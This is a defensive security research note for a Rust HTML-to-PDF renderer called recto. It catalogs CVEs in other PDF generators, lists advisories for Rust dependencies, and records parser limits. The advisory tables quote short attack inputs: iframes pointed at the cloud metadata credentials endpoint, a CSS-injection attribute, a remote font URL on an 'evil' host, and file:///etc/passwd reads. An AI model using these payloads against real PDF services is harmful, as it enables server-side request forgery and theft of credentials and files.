# 10 — Security: attack catalog for HTML→PDF tools and recto's secure defaults

Date: 2026-10-14 · Topic slug: `security` · Author: Phase-0 research agent

Scope: what has gone wrong in wkhtmltopdf, WeasyPrint, PhantomJS, headless-Chrome services (Gotenberg, Browsershot), dompdf, mPDF, TCPDF, Prince, Flying Saucer/openhtmltopdf, xhtml2pdf/ReportLab, jsPDF/pdfmake; which advisories touch the Rust crates recto is likely to depend on; and a concrete default resource/security policy with deterministic error codes.

## Sources inspected

| Name | Version / tag | Commit SHA | License | Last commit | Maintenance assessment |
|---|---|---|---|---|---|
| github/advisory-database (`advisories/github-reviewed`, sparse) | HEAD | `4444999123dcc318a91c64fd6741eee81bf78448` | CC-BY-4.0 | 2026-10-14 | Active (daily) |
| rustsec/advisory-db | HEAD | `22908666e50caf5d9fe40e13edab0d34bddcbaef` | CC0-1.0 | 2026-10-14 | Active (daily) |
| RazrFalcon/roxmltree | 0.21.1 (HEAD; Cargo.toml `version = "0.21.1"`, = latest on index) | `3f5c78dea57662b43a2f41961397b1f5ffe27166` | MIT OR Apache-2.0 | 2026-09-22 | Active |
| linebender/resvg (usvg) | tag `v0.48.1` (usvg 0.48.1 = latest on index) | `68b14c4c3bccdb60344c777406486b54c36ec1a4` | MIT OR Apache-2.0 | 2026-08-02 | Active (Linebender) |
| servo/html5ever | HEAD, workspace `version = "0.40.1"` (= latest; tag `html5ever-v0.40.1` exists) | `7760920edff08e6dfd4b62affee39d8084e9dc45` | MIT OR Apache-2.0 | 2026-09-14 | Active (Servo) |
| rust-vmm/seccompiler | HEAD, `version = "0.5.0"` (= latest) | `c05f20798917d8df814d1154aea3135a53f7f944` | Apache-2.0 OR BSD-3-Clause | 2026-07-27 | Active (Firecracker team) |
| landlock-lsm/rust-landlock | HEAD, `version = "0.4.7"` (= latest, tag `v0.4.7`) | `3dd4c82bf0a852086747e434aae9aa4b8ffe590d` | MIT OR Apache-2.0 | 2026-08-04 | Active (Landlock maintainer) |
| googlefonts/fontations (skrifa 0.48.0, read-fonts 0.45.0) | HEAD (= latest on index) | `cbb2f9240c350829448d4e5d6feba7439a43d461` | MIT OR Apache-2.0 | 2026-10-13 | Very active, OSS-Fuzz |
| harfbuzz/ttf-parser | HEAD, `version = "0.25.1"` | `0c7291223fe9e0bc2808f0255cb991066eedd796` | MIT OR Apache-2.0 | 2026-08-06 | **Declared unmaintained** (RUSTSEC-2026-0192) |
| image-rs/image | tag `v0.25.10` (= latest) | `76e57184f22772dad1138e96954e57945406b15e` | MIT OR Apache-2.0 | 2026-03-10 | Active |
| image-rs/image-png | HEAD, `version = "0.18.1"` (= latest) | `b2f10c6a7e3127d4aaf231f3eae731a33e6eb0bc` | MIT OR Apache-2.0 | 2026-09-23 | Active |
| rust-lang/rust (library/std, library/alloc; sparse) | HEAD | `d8ef4f3fe7031514cbd7d056b7b058814987ecec` | MIT OR Apache-2.0 | 2026-10-14 | — |
| WebSearch (CVE descriptions not in GHSA-reviewed: wkhtmltopdf, Prince, mPDF, SSRF write-ups) | — | — | — | — | URLs cited inline |

Latest published versions checked on `index.crates.io` (non-yanked, non-prerelease) on 2026-10-14: resvg/usvg 0.48.1, roxmltree 0.21.1, html5ever 0.40.1, xml5ever 0.40.0, cssparser 0.38.0, selectors 0.41.0, lightningcss 1.0.0-alpha.72 (prerelease only), skrifa 0.48.0, read-fonts 0.45.0, harfrust 0.14.0, ttf-parser 0.25.1, rustybuzz 0.20.1, swash 0.2.10, fontdb 0.24.0, tiny-skia 0.12.0, image 0.25.10, png 0.18.1, zune-jpeg 0.5.15, zune-inflate 0.2.54, flate2 1.1.10, miniz_oxide 0.9.1, brotli 9.0.0, brotli-decompressor 6.1.0, seccompiler 0.5.0, landlock 0.4.7, rlimit 0.11.0, rustix 1.1.5, nix 0.31.3, stacker 0.1.25, cap 0.1.2, stats_alloc 0.1.10, ureq 3.4.2, reqwest 0.13.5, hyper 1.12.0, zip 9.0.3, minijinja 3.0.0, ramhorns 1.0.1, upon 0.11.0, handlebars 6.4.4, mustache 0.9.0.

---

## 1. Threat model

recto runs in four contexts; the threat differs:

| Context | Who controls the HTML/CSS/data | Primary risks |
|---|---|---|
| CLI on a developer machine, trusted template | developer | low; crashes/hangs only |
| CLI/library inside an app, **template trusted, JSON data untrusted** (the common invoice case) | end user via data fields | markup/CSS injection through data → SSRF, file read, DoS. Every "SSRF via PDF generator" bug-bounty write-up starts here (stored XSS in a name field → `<iframe src=http://169.254.169.254/...>`). |
| Library/CLI rendering **fully untrusted HTML** (user-authored docs, Markdown→HTML) | attacker | everything: SSRF, file read, decompression/parse bombs, layout DoS, parser memory-safety bugs |
| `recto serve` HTTP server, possibly multi-tenant | attacker, unauthenticated if misdeployed | all of the above + HTTP-level DoS, cross-tenant leakage, temp-file races |

Assets: local files (secrets, `/proc/self/environ`, SSH keys, cloud credentials), internal network services (cloud metadata at `169.254.169.254`/`fd00:ec2::254`, Kubernetes API, Redis, admin panels), other tenants' in-flight documents, CPU/RAM availability, integrity of the output PDF (it is shown to third parties: injected JS/links/attachments are phishing vectors).

**Design premise:** recto executes no JavaScript. That single decision removes the largest class of historical bugs (wkhtmltopdf/PhantomJS/html-pdf/Chrome XHR-based file exfiltration: `GHSA-x43g-gj9x-838x`, `GHSA-x4w5-r546-x9qh`, `GHSA-9g3x-6x24-vf9f`, md-to-pdf RCE). What remains is the *declarative* fetch surface (HTML attributes, CSS `url()`, SVG hrefs, fonts) and resource exhaustion — which is exactly where WeasyPrint and dompdf, the two JS-free engines, have accumulated their CVEs. recto is architecturally closest to WeasyPrint/dompdf, so their advisory history is the most predictive.

---

## 2. CVE / advisory history of HTML→PDF tools

### 2.1 GitHub-reviewed advisories (from the advisory-database clone)

Extracted by grepping `affected[].package.name` across `advisories/github-reviewed/**` for the tool list in the task (script output kept at `/tmp/claude-0/src/security/ghad.txt`). PDF *readers* (pypdf, pdfjs-dist) and .NET runtime hits (matched via brotli) omitted except where instructive.

#### WeasyPrint (PyPI `weasyprint`) — closest architectural analogue

| GHSA | CVE | Fixed | Summary | Lesson for recto |
|---|---|---|---|---|
| GHSA-35jj-wx47-4w8r | CVE-2024-28184 | 61.2 | Since 61.0, `<a rel=attachment>` / attachments embed **arbitrary files and URLs** into the PDF **even when `url_fetcher` blocks them** (commit 734ee8e). | Every fetch path must go through one policy-enforcing fetcher; attachments are a fetch. |
| GHSA-983w-rhvv-gwmv | CVE-2025-68616 | 68.0 | `default_url_fetcher` uses `urllib.urlopen`, which **follows redirects without re-checking** the developer's allow/deny logic → SSRF to localhost/metadata. | Redirects must be followed manually, each hop re-validated (scheme, host, resolved IP). |
| GHSA-jf6q-chmf-3h3v | CVE-2026-55073 | 70.0 | `write_pdf(xmp_metadata=[url])` and `write_pdf(stylesheets=[str])` build a **fresh default fetcher**, bypassing the document's restrictive one; transitive through `@import`. | No code path may construct a default/unrestricted fetcher. Make the fetcher a required, non-`Default` value threaded through the whole job (type-level enforcement). |
| GHSA-jhhc-3hcp-qhm5 | CVE-2026-49452 | none listed | Presentational hints: `background` attribute string-interpolated into CSS: `<body background="x);background-image:url(http://169.254.169.254/latest/meta-data/)">`. | Never build CSS by string concatenation from attributes; map presentational hints to typed values. |
| GHSA-r543-q48m-4c9j | CVE-2026-106443 | 70.0 | Image bytes passed to Pillow's format-sniffing `Image.open`; EPS → Ghostscript → RCE. | Allowlist decoders (PNG, JPEG, GIF, WebP, SVG); never dispatch to a generic multi-format decoder with exotic formats enabled. In Rust: build `image` with only the needed features. |

#### dompdf (Packagist `dompdf/dompdf`) — the other JS-free engine; 20 advisories

| GHSA | CVE | Fixed | Summary |
|---|---|---|---|
| GHSA-x752-qjv4-c4hc | CVE-2022-28368 | 1.2.1 | **RCE**: `@font-face { src: url(http://evil/x.php) }` — remote font cached into a web-accessible dir with attacker-controlled `.php` extension. |
| GHSA-6x28-7h8c-chx4 | CVE-2022-41343 | 2.0.1 | URI validation failure does not halt font registration → remote file inclusion. |
| GHSA-3cw5-7cxw-v5qg | CVE-2023-23924 | 2.0.2 | SVG `<IMAGE>` (uppercase) bypasses the case-sensitive href check → `phar://` deserialization. |
| GHSA-56gj-mvh6-rp75 | CVE-2023-24813 | 2.0.3 | Bypass of the above: dompdf's attribute parser vs php-svg-lib's parser disagree on `href`/`xlink:href` precedence (parser differential). |
| GHSA-3qx2-6f78-w2j2 | CVE-2023-50262 | 2.0.4 | SVG A → `<image href=B.svg>` → `<image href=A.svg>`: chained recursion (only self-reference was checked) → memory exhaustion. |
| GHSA-3vjh-xrhf-v9xh | CVE-2021-3902 | 2.0.0 | XXE in SVG parser → SSRF / phar deserialization, even with `isRemoteEnabled=false`. |
| GHSA-577p-7j7h-2jgf | CVE-2021-3838 | 2.0.0 | Deserialization of untrusted data (phar). |
| GHSA-pf6p-25r2-fx45 | CVE-2022-0085 | 2.0.0 | SSRF. |
| GHSA-5qj8-6xxj-hp9h | CVE-2022-2400 | 2.0.0 | chroot check bypass. |
| GHSA-wvh6-f5jh-8gw4 | CVE-2026-55554 | 3.1.6 | chroot check is `strpos($realfile, $chroot) === 0` → `/var/www/root_secret/x` passes for chroot `/var/www/root` (prefix, not path-component, comparison). |
| GHSA-cx96-42px-69fm | CVE-2026-56722 | 3.1.6 | Local file read: SVG embedded as `data:` URI references local images; the data-URI SVG path skipped `validateLocalUri()` (default config exploitable). |
| GHSA-j8qw-6jw8-r297 | CVE-2026-59943 | 3.1.6 | Embedded SVG images leak existence of files/dirs. |
| GHSA-7x2p-4jvh-6384 | CVE-2026-55555 | 3.1.6 | File-existence oracle via `@font-face` `file://` repeated → OOM only if file exists. |
| GHSA-f5gf-2cj8-52g2 | CVE-2026-59942 | 3.1.6 | 30000×30000 high-entropy image (base64) → 900 Mpx decode → CPU/RAM exhaustion; dimension checks bypassed via CSS containers. |
| GHSA-8hg6-c449-896m | CVE-2026-59941 | 3.1.6 | Resource consumption from *declared* BMP dimensions. |
| GHSA-qr6q-w4gj-3865 / GHSA-jwf8-mjj8-r8hq / GHSA-48r9-4v93-x4wh / GHSA-jjwj-w3gc-gcw4 / GHSA-q83c-64c9-c42m | CVE-2014-2383 / 2014-5011 / 2010-4879 / 2014-5013 / 2014-5012 | 0.6.x | Historical arbitrary file read, info disclosure, RFI, RCE, DoS. |

#### Headless-Chrome/wkhtmltopdf wrappers and services

| Package | GHSA | CVE | Fixed | Summary |
|---|---|---|---|---|
| gotenberg v8 | GHSA-2pmr-289p-44r3 | CVE-2026-42592 | none | **DNS rebinding**: `FilterOutboundURL` resolves, checks, discards IPs; Chromium resolves again → private IP. |
| gotenberg v8 | GHSA-86m8-88fq-xfxp | CVE-2026-45741 | none | `IsPublicIP` treats `2002::/16` (6to4), `64:ff9b::/96`, `64:ff9b:1::/48` (NAT64), `fec0::/10` as public → reach `169.254.169.254` via AAAA. |
| gotenberg v8 | GHSA-4vmc-gm8v-m35h | CVE-2026-42596 | 8.32.0 | Regex deny-list bypass with `http://[::ffff:127.0.0.1]:…` (IPv4-mapped IPv6). |
| gotenberg v8 | GHSA-5q7p-7jgv-ww56 / GHSA-jjwv-57xh-xr6r | CVE-2026-40280 / CVE-2026-27018 | 8.31.0 / 8.29.0 | Case-sensitive scheme regex: `HTTP://` / `FILE:` bypass. |
| gotenberg v8 | GHSA-chwh-f6gm-r836 | CVE-2026-42595 | 8.32.0 | SSRF via redirect bypassing deny-list. |
| gotenberg v7/v8 | GHSA-g924-cjx7-2rjw | CVE-2026-42597 | 8.32.0 | `file:///tmp/` exempted by deny-list → read **other tenants' in-flight conversion inputs** from per-request work dirs. |
| gotenberg v8 | GHSA-hwc4-gmrw-5222 | CVE-2026-44829 | 8.33.0 | `filepath.Base` on Linux keeps `..\..\` → zip-slip in returned zip on Windows extractors. |
| gotenberg v8 | GHSA-vp73-vjw8-8f32 | CVE-2026-45742 | 8.33.0 | Race condition in multipart `downloadFrom` handling. |
| gotenberg v8 | GHSA-r33j-c622-r6qp | CVE-2026-42594 | 8.32.0 | Unauthenticated DoS via context reuse in async webhook goroutine. |
| gotenberg v8 | GHSA-fmwg-qcqh-m992 | CVE-2026-35458 | 8.30.0 | ReDoS via user-supplied regex scope for `extraHttpHeaders`. |
| gotenberg v8 | GHSA-rqgh-gxv4-6657, GHSA-q7r4-hc83-hf2q, GHSA-7v3r-m9c8-r855, GHSA-62p3-hvxx-fxg4, GHSA-qmwh-9m9c-h36m | CVE-2026-42589 et al. | partly none | **Metadata → ExifTool argument injection** (newline in value, group-prefixed tag names) → RCE / arbitrary file rename. |
| gotenberg v8 | GHSA-3cv5-q585-h563 | CVE-2026-42593 | none | Arbitrary PDF read via stamp/watermark expressions. |
| spatie/browsershot | GHSA-8c2c-jxwj-jqgf, GHSA-rv74-mh27-4jpv, GHSA-g2r4-phv7-5fgv, GHSA-f2q5-6mx7-q9qq, GHSA-j2gw-r24m-j2qw, GHSA-v528-6rq9-h6gw, GHSA-qw64-6vcc-8ghx | CVE-2022-41706, CVE-2020-7790, CVE-2024-21544, CVE-2025-1026, CVE-2025-1022, CVE-2024-21547, CVE-2025-3192 | various; last none | Repeated `file://` scheme-check bypasses (e.g. `file:/`, `view-source:file://`, whitespace/case), path traversal, SSRF in `setURL()`. |
| knplabs/knp-snappy (wkhtmltopdf wrapper) | GHSA-c5fp-p67m-gq56 | CVE-2026-46683 | 1.7.0 | SSRF + local file read via `xsl-style-sheet` option. |
| knplabs/knp-snappy | GHSA-gq6w-q6wh-jggc, GHSA-92rv-4j2h-8mjj, GHSA-vpr4-p6fq-85jc | CVE-2023-28115, CVE-2023-41330, CVE-2026-46643 | 1.4.2/1.4.3/1.7.1 | phar deserialization RCE; binary path never shell-escaped. |
| pdfkit (Ruby) | GHSA-rhwx-hjx2-x4qr | CVE-2022-25765 | 0.8.7.2 | **Command injection** via URL passed to wkhtmltopdf CLI. |
| pdfkit (Python) | GHSA-9g3x-6x24-vf9f | CVE-2025-26240 | none | `from_string` → wkhtmltopdf JS → local file exfiltration. |
| puppeteer | GHSA-c2gp-86p4-5935 | CVE-2019-5786 | 1.13.0 | UAF in bundled Chromium (browser memory-safety bugs flow through). |
| phantomjs | GHSA-x43g-gj9x-838x | CVE-2019-17221 | none (dead) | XHR to `file://` → arbitrary file read rendered into output. |
| html-pdf (npm, PhantomJS) | GHSA-x4w5-r546-x9qh | CVE-2019-15138 | 3.0.1 (mitigation) | Same, `request.open("GET","file:///etc/passwd")`. |
| markdown-pdf | GHSA-qghr-877h-f9jh, GHSA-p7c9-jqhq-vr3v | CVE-2023-0835, CVE-2018-3770 | none / 9.0.0 | Local file read via server-side XSS; RCE. |
| md-to-pdf | GHSA-547r-qmjm-8hvw, GHSA-x949-7cm6-fm6p | CVE-2025-65108, CVE-2021-23639 | 5.2.5 / 5.0.0 | **Front-matter parsed as JS** (gray-matter engines) → RCE. Template/front-matter engines are code. |
| electron-pdf | GHSA-3jcv-5f9p-2f2p | CVE-2024-1648 | none | XSS → server context. |

#### Other generators (PHP/Python/JS)

| Package | GHSA | CVE | Fixed | Summary |
|---|---|---|---|---|
| mpdf/mpdf | GHSA-3cwc-m7c2-qr86 | CVE-2019-1000005 | 7.1.8 | phar unsafe deserialization via image path. (Not in GHSA-reviewed: **CVE-2022-50897**, mPDF 7.0 local file inclusion via `<annotation file=…>` parameters — WebSearch: https://www.cvelogic.com/cve/CVE-2022-50897, https://osv.dev/vulnerability/CVE-2022-50897.) |
| tecnickcom/tcpdf | GHSA-5hw4-m7f3-hhx8, GHSA-rmv2-8jjc-23xw, GHSA-4p8j-vhjm-6pvw, GHSA-mx3p-fhpw-x6rv, GHSA-9mgx-552f-59p6, GHSA-w95c-7994-ghpr, GHSA-g9wg-98c2-qv3v, GHSA-qx95-cwh6-9mvq | CVE-2018-17057, CVE-2024-51058, CVE-2024-56519, CVE-2024-22640, CVE-2024-56521, CVE-2024-56522, CVE-2024-32489, CVE-2024-56527 | 6.2.22 … 6.8.0 | Deserialization, LFI, no SVG sanitization, **ReDoS**, missing cert validation, XSS in error messages. |
| reportlab | GHSA-9q9m-c65c-37pq | **CVE-2023-33733** | 3.6.13 | RCE: `rl_safe_eval` sandbox escape via `<font color="[[...exec...]]">` — reachable from **xhtml2pdf** which passes HTML color attributes into ReportLab. "Eval with a sandbox" is not a sandbox. |
| reportlab | GHSA-mpvw-25mg-59vx | CVE-2020-28463 | 3.5.55 | SSRF via `<img src>` (no way to disable fetching). |
| reportlab | GHSA-pj98-2xf6-cff5, GHSA-qpg2-vx7j-3869 | CVE-2019-19450, CVE-2019-17626 | 3.5.31, 3.5.28 | RCE via paraparser `eval`; XML injection. |
| xhtml2pdf | GHSA-jj5c-hhrg-vv5h | CVE-2024-25885 | none | DoS via crafted string (regex in `getColor`). |
| spipu/html2pdf | GHSA-6m93-343m-3jrc, GHSA-99fg-2h75-m92h | CVE-2021-45394, CVE-2023-39062 | 5.2.4, 5.2.8 | XSS. |
| jspdf | GHSA-p5xg-68wr-hm3m, GHSA-pqxr-3g65-p328, GHSA-9vjf-qc39-jprp, GHSA-7x6v-j9x4-qf24 | CVE-2026-25940, CVE-2026-24737, CVE-2026-25755, CVE-2026-31898 | 4.1.0–4.2.1 | **PDF object injection**: unescaped strings in AcroForm/addJS/FreeText color close the string and inject `/JS`/`/AA` objects → JS execution in viewers. |
| jspdf | GHSA-vm32-vv63-w422 | CVE-2026-24043 | 4.1.0 | **XMP metadata injection** (unescaped XML). |
| jspdf | GHSA-67pg-wm7f-q7fj, GHSA-95fx-jjr5-f39c, GHSA-8mvj-3j78-4qmw | CVE-2026-25535, CVE-2026-24133, CVE-2025-57810 | 4.2.0, 4.1.0, 3.0.2 | DoS via declared GIF/BMP dimensions; other DoS. |
| jspdf | GHSA-57f3-gghm-9mhc, GHSA-w532-jxjh-hjhj | CVE-2021-23353, CVE-2025-29907 | 2.3.1, 3.0.1 | ReDoS (and a bypass of the fix). |
| jspdf | GHSA-f8cm-6447-x5h2 | CVE-2025-68428 | 4.0.0 | Local file inclusion / path traversal (Node build). |
| pdfmake | GHSA-wp52-r2fp-4vmr, GHSA-rj3r-r7hh-jxfq | CVE-2026-26801, CVE-2025-11362 | 0.3.6, 0.3.0-beta.17 | SSRF; **unbounded redirect loop** → resource exhaustion. |
| pdfjs-dist | GHSA-wgrm-67xf-hhpq, GHSA-hq66-cqwq-w95j | CVE-2024-4367, CVE-2026-16633 | 4.2.67, 6.2.108 | Viewer-side JS execution from malicious PDF (font matrix). Relevance: recto's output is opened in viewers; we must never emit anything that resembles these constructs from user strings. |

### 2.2 CVEs not in GHSA-reviewed (WebSearch)

| Tool | CVE | Summary | Source |
|---|---|---|---|
| wkhtmltopdf 0.12.6 | **CVE-2022-35583** (CVSS 9.8) | SSRF: injected `<iframe src="http://10.0.0.1/…">` reaches internal hosts. **No fix**; Debian notes fetching is by design; upstream archived. | https://tenable.com/cve/CVE-2022-35583, https://security-tracker.debian.org/tracker/CVE-2022-35583 |
| wkhtmltopdf ≤0.12.5 | CVE-2020-21365 | Local filesystem read by default (`file://`, `<iframe src=file:///etc/passwd>`, JS `XMLHttpRequest`). 0.12.6 changed default to block local file access; `--enable-local-file-access` / `--allow <path>` re-enable. | https://www.debian.org/lts/security/2022/dla-3158 |
| PrinceXML ≤10 | CVE-2018-19858 (CVSS 8.6) | XXE via XML referenced from HTML (e.g. iframe) → local file read + SSRF. SYSS-2016-037: XXE via crafted SVG. | https://nvd.nist.gov/vuln/detail/CVE-2018-19858, https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-037.txt |
| PDFreactor | CVE-2019-12154 | XXE → local file disclosure / DoS. | https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2019-12154 |
| Flying Saucer / openhtmltopdf | none found | No CVE found; Flying Saucer parses XHTML with the JDK XML parser, so XXE exposure depends on the embedder's parser config (Lexfo write-up on a Grails plugin built on it). **UNVERIFIED** whether current openhtmltopdf disables external entities by default. | https://blog.lexfo.fr/grails-pdf-plugin-xxe.html |
| Headless Chrome PDF services (generic) | many bounty reports | Classic chain: data field → stored HTML → `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` → role name → credentials rendered into PDF. PDF `/Producer` reveals "HeadlessChrome NN" (version fingerprinting). | https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/, https://triskelelabs.com/extracting-your-aws-access-keys-through-a-pdf-file/, https://intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators |

### 2.3 Patterns across the history

1. **Fetch-policy bypass is the #1 bug class** (WeasyPrint ×4, dompdf ×10, Gotenberg ×8, Browsershot ×7): a second code path that fetches without the policy (attachments, XMP, user stylesheets, SVG inside data URIs, fonts), redirects, case/encoding variants of schemes, IPv6 encodings of private IPv4, DNS rebinding, prefix-string path checks.
2. **Parser differentials** (dompdf CVE-2023-24813; usvg `href` precedence comment in `crates/usvg/src/parser/svgtree/parse.rs` around `resolve_href`): the validator and the consumer must be the *same* code. In recto, URL extraction for policy and URL use for fetching must be one function returning a typed `ResolvedUrl`.
3. **Declared dimensions trusted** (dompdf BMP, jsPDF GIF/BMP, dompdf 30000²): check width×height×bpp *before* allocation.
4. **Recursion via references** (dompdf SVG chain, lopdf nested arrays, usvg `use`): need cycle detection *and* global depth/size caps.
5. **Things that are secretly interpreters**: Ghostscript via Pillow, ReportLab `eval`, md-to-pdf front-matter JS, ExifTool args, PHP `phar://`. recto must shell out to nothing and embed no interpreter.
6. **Output-side injection**: jsPDF object injection and XMP injection, Gotenberg ExifTool metadata injection.
7. **Multi-tenant leakage via shared temp dirs** (Gotenberg `/tmp`).

---

## 3. Advisories affecting Rust crates recto may depend on

From rustsec/advisory-db `crates/<name>/*.md` and GHSA crates.io ecosystem. Crates with **no** advisories in either DB as of 2026-10-14: html5ever, markup5ever, xml5ever, cssparser, selectors, lightningcss, resvg, usvg, roxmltree, svgtypes, tiny-skia, fontdb, skrifa, read-fonts, swash, png, flate2, miniz_oxide, brotli/brotli-decompressor (Rust), zune-jpeg, zune-inflate, gif, harfrust, krilla, pdf-writer. (No advisory ≠ no bugs; see fuzzing status below.)

| Advisory | Crate | Date | Summary | Patched | Relevance |
|---|---|---|---|---|---|
| RUSTSEC-2026-0192 | ttf-parser | 2026-06-28 | **Unmaintained** (issue harfbuzz/ttf-parser#217); alternative: skrifa | none | Avoid as a new dependency; resvg/usvg text and fontdb currently depend on it (**UNVERIFIED** for 0.48.1 dependency graph — check `crates/usvg/Cargo.toml`). |
| RUSTSEC-2026-0206 | rustybuzz | 2026-07-11 | **Unmaintained** (harfbuzz/rustybuzz#166); alternative: harfrust | none | Use harfrust (0.14.0) for shaping. |
| RUSTSEC-2026-0194 | quick-xml | 2026-06-29 | O(N²) duplicate-attribute check; 80k attrs ≈ 6 s, 800k ≈ 10 min; pure CPU so I/O timeouts don't help | ≥ 0.41.0 | If used for XMP/XML; pin ≥0.41. |
| RUSTSEC-2026-0195 | quick-xml | 2026-06-29 | `NsReader` allocates ~3× start-tag size for namespace decls before caller sees event | ≥ 0.41.0 | Same. |
| RUSTSEC-2026-0187 | lopdf | 2026-06-21 | Stack overflow on ~10,380-deep nested arrays; **SIGABRT, not catchable by `catch_unwind`** | ≥ 0.42.0 | Only if recto parses PDFs (e.g. PDF overlay/merge/`<img src=x.pdf>`). Illustrates the stack-overflow class. |
| RUSTSEC-2026-0305 | librsvg | 2026-09-23 | UAF when XML includes have duplicated entities | ≥ 2.63.2 etc. | Not a planned dep; shows XML-entity handling remains a bug source. |
| RUSTSEC-2024-0401 | zlib-rs | 2024-11-14 | Stack overflow with malicious decompression input | ≥ 0.4.0 | If flate2 is built with `zlib-rs` backend, pin ≥0.4. |
| RUSTSEC-2019-0014 / GHSA-m2pf-hprp-3vqm | image | 2019 | Uninitialized drop in HDR decoder (CVE-2019-16138) | ≥ 0.21.3 | Historical; disable HDR feature anyway. |
| RUSTSEC-2020-0073 | image | 2020 | Unsound provenance (CVE-2020-35916) | ≥ 0.23.12 | Historical. |
| RUSTSEC-2023-0021 | stb_image | 2023 | NULL deref | ≥ 0.2.5 | Don't use C image decoders. |
| RUSTSEC-2026-0115/0116/0117 | imageproc | 2026-05-01 | Fragile bounds checks | ≥ 0.26.2 | Not needed. |
| RUSTSEC-2025-0168 | zip | 2025-03-16 | Path canonicalization → arbitrary file write on extraction | ≥ 2.3.0 | Template-asset bundles (zip) — see zip-slip. |
| RUSTSEC-2018-0002, 2021-0080, 2026-0067, 2026-0068 | tar | various | Link overwrite, symlink chmod, PAX size confusion | — | Avoid tar for asset bundles or extract in-memory only. |
| GHSA-5v8v-66v8-mwm7 | compu-brotli-sys | 2022 | Integer overflow in bundled C brotli (CVE-2020-8927) | 1.0.9 | Use pure-Rust brotli-decompressor for WOFF2. |
| GHSA-2qfp-q593-8484 | (PyPI) brotli | 2025-10-31 | Decompression DoS (CVE-2025-6176) | 1.2.0 | Reminder: brotli ratio can be >1000:1; cap output. |
| RUSTSEC-0000-0000.brotli (rustls) | rustls | 2026-10-14 | Brotli cert decompression can allocate up to 1 GiB pre-auth | (placeholder ID) | Only if network feature uses rustls with cert compression. |
| RUSTSEC-2024-0336, 2024-0399, 2026-0285 | rustls | — | Infinite loop, reachable panic, TLS 1.3 boundary | — | Network feature only; keep current. |
| RUSTSEC-2021-0078/0079/0020, 2020-0008, 2022-0022 | hyper | — | Request smuggling, integer overflow, unsound | fixed in 0.14.x | Server mode: use current hyper 1.x. |
| RUSTSEC-2023-0034, 2024-0003, 2024-0332, 2026-0258 | h2 | — | Resource exhaustion, CONTINUATION flood, unbounded empty DATA frames | — | Server mode: prefer HTTP/1.1 only by default, or keep h2 current. |
| RUSTSEC-2021-0135, 2022-0043 | tower-http | — | Windows path traversal in static file serving | — | Don't serve files from server mode. |
| RUSTSEC-2022-0048 | xml-rs | 2022 | Unmaintained | — | Avoid. |

**Fuzzing status of font stacks:**
- fontations (skrifa/read-fonts): README.md "## Fuzzing" — fuzzers in `fuzz/fuzz_targets/` (`fuzz_skrifa_outline.rs`, `fuzz_skrifa_charmap.rs`, `fuzz_skrifa_color.rs`, `fuzz_name.rs`, `fuzz_basic_metadata.rs`, …) run continuously on OSS-Fuzz (`projects/fontations`). `#![forbid(unsafe_code)]` at `skrifa/src/lib.rs:15` and `read-fonts/src/lib.rs:60`. Used by Chrome for font parsing, which makes it the most battle-tested pure-Rust font parser.
- ttf-parser 0.25.1: `#![forbid(unsafe_code)]` at `src/lib.rs:36`; has `testing-tools/` but no `fuzz/` dir at HEAD; now unmaintained (RUSTSEC-2026-0192).
- Panics are the realistic failure mode for safe-Rust parsers (index out of bounds, arithmetic overflow in debug, `unwrap`). Hence the per-job `catch_unwind` boundary (§6.1) is mandatory, not optional.

---

## 4. Verified behaviour of key parsers

### 4.1 html5ever 0.40.1 — no entity expansion bombs
- HTML has no DTDs; character references resolve against a **fixed static table**: `web_atoms/entities.rs:1` `pub static NAMED_ENTITIES: [(&str, u32, u32); 2231]`, looked up in `html5ever/src/tokenizer/char_ref/mod.rs:268`. Each reference expands to ≤2 code points. **Billion-laughs is impossible in HTML parsing.**
- Adoption agency loop bounded: `html5ever/src/tree_builder/mod.rs:725` `for _ in 0..8` (spec's outer-loop limit).
- No tree-depth limit found in `html5ever/src/tree_builder/*.rs` (grep for depth/MAX_ empty). `<div>`×1e6 produces a 1e6-deep tree; recto's DOM sink must enforce `max_dom_depth` itself (and every recursive pass downstream — style, layout, tagging, drop — must either be iterative or bounded by that cap). Browsers cap parser depth (Blink: 512 — **UNVERIFIED**, from memory).

### 4.2 roxmltree 0.21.1 (used by usvg) — bounded entity expansion, no XXE
- `ParsingOptions` (`src/parse.rs:325-354`): `allow_dtd` default `false`; `nodes_limit` default `u32::MAX`; `entity_resolver: Option<&EntityResolver>` default `None`.
- `LoopDetector` (`src/parse.rs:470-545`): entity nesting depth ≤10 (`inc_depth`), ≤255 references resolved per root reference (`inc_references`, `u8::MAX`); references at depth 0 are unlimited. Classic billion-laughs (`lol1..lol9`, 10 refs each) → `Error::EntityReferenceLoop` after 255 refs. Residual amplification: each top-level `&x;` (~4 bytes input) can expand to ≤255 × (largest entity value) — so an input of size S can yield roughly O(S²/1000)-ish text; bounded but not linear. recto must cap total SVG text/node count after parse.
- External entities: only resolved through `entity_resolver`; with `None`, `src/parse.rs:364` "If it yields None, the entity is discarded and will yield errors if referenced" → **no XXE file/URL reads** unless a resolver is supplied. recto must never supply one.
- Element nesting is iterative: `src/tokenizer.rs:665` `parse_content` uses a loop with `depth: u32` counter (no recursion).

### 4.3 usvg 0.48.1
- `Tree::from_str` (`crates/usvg/src/parser/mod.rs:158-163`) sets `allow_dtd: true`, leaves `nodes_limit` at default (unlimited) → entity loop detector above applies; external entities still unresolved.
- SVG tree limits: `crates/usvg/src/parser/svgtree/parse.rs:182` `if depth > 1024 { return Err(Error::NodesLimitReached) }` (depth includes `use` expansion: `parse_svg_use_element(..., depth + 1, ...)`); `:417` `if doc.nodes.len() > 1_000_000 { return Err(Error::NodesLimitReached) }`. Recursive `use` detection (`:597`, `:625-641`), `fix_recursive_patterns`, `fix_recursive_links` for clipPath/mask/filter, `fix_recursive_fe_image` (`:125-129`), recursive marker check (`parser/marker.rs:64`). 1e6 nodes is too generous for recto's budgets → recto should pre-check (§7).
- **SVGZ is unbounded**: `decompress_svgz` (`parser/mod.rs:180-189`) does `GzDecoder::read_to_end` with no cap → gzip bomb (1 MB → ~1 GB). recto must decompress SVGZ itself with a capped reader and pass plain text to `from_str`, or disable usvg's `svgz` feature.
